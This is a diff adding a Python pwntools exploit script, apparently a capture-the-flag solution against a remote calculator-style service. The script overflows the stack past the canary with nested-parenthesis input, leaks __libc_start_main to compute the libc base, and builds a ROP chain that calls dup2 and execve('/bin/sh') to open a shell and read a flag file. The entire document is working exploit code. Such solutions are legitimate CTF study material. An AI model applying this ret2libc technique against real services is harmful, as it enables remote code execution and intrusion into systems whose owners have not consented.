@@ -1,0 +1,67 @@
+from pwn import *
+
+p = connect('h4x.0x04.net', 31337)
+# libc_elf = ELF('/lib32/libc-2.23.so') # my libc
+libc_elf = ELF('./libc-2.19.so') # remote libc
+
+def pos_num(n):
+    return n if n >= 0 else 2**32 + n
+
+def get_payload(n, c='+'):
+    return n * '(' + c + n * ')'
+
+def send(n, c='+'):
+    payload = get_payload(n, c)
+    log.info('sending: ' + payload)
+    p.sendline(payload)
+    return int(p.recvline())
+
+def after_canary(n, m, payload='+'):
+    payload = '0+' + get_payload(m - 1, payload)
+    return send(n - 1, payload)
+
+def after_ret(n, m, k):
+    payload = '0+' + get_payload(k - 1)
+    return after_canary(n, m - 1, payload)
+
+def put_ret_value(n, m, to_put):
+    to_put = reversed(to_put)
+    to_put = map(pos_num, to_put)
+    to_put = map(str, to_put)
+    payload = (len(to_put) - 1) * '(' + '0+' + ')+'.join(to_put)
+    return after_canary(n, m - 2, payload)
+
+libc_start_main = pos_num(after_ret(31, 4, 16) - 243) # 247 - my libc, 243 - remote libc
+log.info('libc_start_main@libc: ' + hex(libc_start_main))
+libc_start_main_offset = libc_elf.symbols['__libc_start_main']
+libc_base = libc_start_main - libc_start_main_offset
+log.info('libc base address: ' + hex(libc_base))
+
+dup2_offset = libc_elf.symbols['dup2']
+log.info('offset of dup2: ' + hex(dup2_offset))
+dup2 = libc_base + dup2_offset
+log.info('dup2@libc: ' + hex(dup2))
+
+rop = ROP(libc_elf)
+pop_offset = rop.search(12)[0]
+pop = libc_base + pop_offset
+
+execve_offset = libc_elf.symbols['execve']
+log.info('offset of execve: ' + hex(execve_offset))
+execve = libc_base + execve_offset
+log.info('execve@libc: ' + hex(execve))
+
+binsh_offset = list(libc_elf.search('/bin/sh'))[0]
+log.info('offset of binsh: ' + hex(binsh_offset))
+binsh = libc_base + binsh_offset
+log.info('binsh@libc: ' + hex(binsh))
+
+payload = [dup2, pop, 4, 0, dup2, pop, 4, 1, execve, 0, binsh, 0, 0]
+log.info('payload: ' + str(payload))
+put_ret_value(31, 4, payload)
+
+p.sendline('cat flag.txt')
+log.info('flag: ' + p.recvline())
+
+p.interactive()
+p.close()
